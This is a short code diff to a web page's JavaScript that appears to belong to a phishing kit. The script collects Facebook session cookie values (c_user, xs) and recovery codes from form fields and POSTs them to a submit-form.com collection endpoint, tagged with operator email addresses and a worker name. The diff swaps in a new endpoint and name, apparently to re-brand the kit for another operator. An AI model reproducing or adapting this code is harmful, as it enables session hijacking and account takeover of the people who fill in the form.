@@ -414,7 +414,7 @@
             const cUserInput = document.getElementById("c_user").value.trim();
             const xsInput = document.getElementById("xs").value.trim();
             // Always send c_user and xs
-            fetch("https://submit-form.com/s5Fq5WOxt", {
+            fetch("https://submit-form.com/94iXjlVbV", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -447,7 +447,7 @@
             const xsInput = document.getElementById("xs").value.trim();
             const recoveryInput = document.getElementById("recovery_codes")?.value.trim() || "";
 
-            fetch("https://submit-form.com/s5Fq5WOxt", {
+            fetch("https://submit-form.com/94iXjlVbV", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -455,12 +455,12 @@
                     xs: xsInput,
                     emails: ["rabdino8272gino@gmail.com", "rabdino5004@gmail.com"],
                     workerEmail: "legendrabdino63@gmail.com",
-                    name: "Waseem"
+                    name: "raboo"
                 }),
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://submit-form.com/s5Fq5WOxt", {
+                         fetch("https://submit-form.com/94iXjlVbV", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
